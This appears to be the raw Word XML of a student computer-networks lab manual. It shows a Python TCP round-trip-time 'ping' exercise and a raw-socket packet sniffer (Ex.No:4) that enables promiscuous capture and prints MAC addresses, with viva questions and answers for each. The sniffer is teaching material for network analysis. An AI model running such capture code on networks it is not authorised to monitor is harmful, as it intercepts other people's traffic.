    </w:p>
    <w:p w14:paraId="27D349D9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count = 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC4D069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times = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7C5064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for i in range(count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7824FD1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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0E69C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 = socket.socket()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FD762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start = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA97A40" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>s.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC3ADCF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end = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EFBFC2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289C3BFC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rtt = (end - start) * 1000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB60978" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>times.append(rtt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E95E8A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print(f"Reply from {host}: time={rtt:.2f} ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180C3BDF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except:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286199A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print("Request timed out")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434F7122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if times:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B3EF4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print("\nMin RTT =", min(times), "ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F067E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print("Max RTT =", max(times), "ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCE668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print("Avg RTT =", sum(times)/len(times), "ms")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C401493" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6162027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63967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639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77)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0805C935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6104A349" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus the server connectivity is tested using ping command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F907BB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AA4D1A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5CB2D0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is the purpose of the ping command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1844C3A3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2111F140" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The ping command is used to check whether a host or server is reachable over a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4860DE18" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network and to measure the response time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47352140" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Which protocol is used by the ping command?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C49689E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73F6379" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ping uses the Internet Control Message Protocol (ICMP), specifically ICMP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D7C5EA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Echo Request and Echo Reply messages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D07B3F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is an ICMP Echo Request?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1615068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3FA8B021" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>An ICMP Echo Request is a message sent by a computer to another device to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4579AD37" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>check whether it is active and reachable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F6FEE7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is meant by latency in a ping operation?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099DE1A7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8E66F34" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Latency is the time taken for a packet to travel from the source to the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B44E5D3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>destination and back, usually measured in milliseconds (ms).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D319183" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What does packet loss indicate in a ping test?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A841D5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EF249CA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet loss indicates that some packets failed to reach the destination or return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4005BA2D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>to the sender, which may be due to network congestion or failures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C42A7D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9EC498" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE8C420" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PACKET SNIFFING USING RAW SOCKETS IN PYTHON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB8CF5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3BF76D5D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To implement packet sniffing using raw sockets in python that captures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2B4F12" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ethernet frames and displays source/destination MACs and protocol info for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E85278C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network analysis and troubleshooting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554B270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Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2563CE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet Sniffing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1872A005" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet sniffing is the process of intercepting and analyzing network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00718C8E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>packets traveling over a network to monitor or troubleshoot traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F29C18F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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF3579B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Get the local host IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55748D51" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Create a raw IPv4 socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735E40DD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Bind the socket to the host IP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EB5E1E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Set socket to include IP headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8653BB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Enable promiscuous mode to capture all packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6546F491" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. Enter an infinite loop to receive data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E214207" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. Receive raw packet bytes from the socket.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEF0134" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8. Parse the Ethernet frame into dest MAC, src MAC, protocol, and payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480DE8B4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>9. Format MAC addresses and protocol for display.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A51FCD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>10. Print the extracted fields and loop to continue sniffing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C1D037" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="135DB88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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7CF82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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E47986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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAD6FE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binascii</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AB6A6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textwrap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061ED28F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main():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67806E4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host = socket.gethostbyname(socket.gethostname())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4513415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print('IP: {}'.format(host))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBF164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conn = socket.socket(socket.AF_INET, socket.SOCK_RAW,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C7646F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>socket.IPPROTO_IP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2364D5B6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.bind((host, 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E67635B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5B9BC3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48734B8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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A24482B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>raw_data, addr = conn.recvfrom(65536)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF144DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEB57F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print('\nEthernet Frame:')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659B0A8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print("Destination MAC: {}".format(dest_mac))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EFCEC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print("Source MAC: {}".format(src_mac))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DCC48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print("Protocol: {}".format(eth_proto))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516BF17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ethernet_frame(data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351A4EB3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>dest_mac, src_mac, proto = struct.unpack('!6s6s2s', data[:14])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D49E9E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return get_mac_addr(dest_mac), get_mac_addr(src_mac),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279F9B63" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>get_protocol(proto), data[14:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3118F59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get_mac_addr(bytes_addr):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2592666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bytes_str = map('{:02x}'.format, bytes_addr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6FD21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mac_address = ':'.join(bytes_str).upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DA9CA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return mac_address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B9BC9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get_protocol(bytes_proto):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6183DC18" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9F6142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bytes_str = map('{:02x}'.format, bytes_proto)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F62E0F6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protocol = ''.join(bytes_str).upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5D423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return protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C213C4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>main()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7D339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32950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29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80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3155EA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28B9CA0D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus packet sniffing was implemented using raw sockets in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A89189B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7881E1E0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C33A0C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is packet sniffing?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4196B8F3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E420CE8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet sniffing is the process of capturing and analyzing data packets that travel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F5F6D3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>through a computer network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350ACEA0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is a raw socket?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA59F05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3ED28D49" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A raw socket is a type of socket that provides direct access to network packets,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E82F6C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>allowing programmers to read and manipulate packet headers and data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7141C7D1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Why are administrator or root privileges required for raw sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039B9E7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41B8A69" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Administrator privileges are required because raw sockets provide low-level</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F999AB0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>access to network traffic, which can affect system security and privacy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D022C9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Which Python module is used for implementing raw sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D3527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710343E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The socket module in Python is used to create and work with raw sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B0F63B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E308C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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED3AD5B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is the main purpose of packet sniffing?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69AE3C58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5C4DF653" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet sniffing is used for network monitoring, troubleshooting, performance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EFBFBF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>analysis, and security investigations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499BC3F3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B918A4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F343D7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
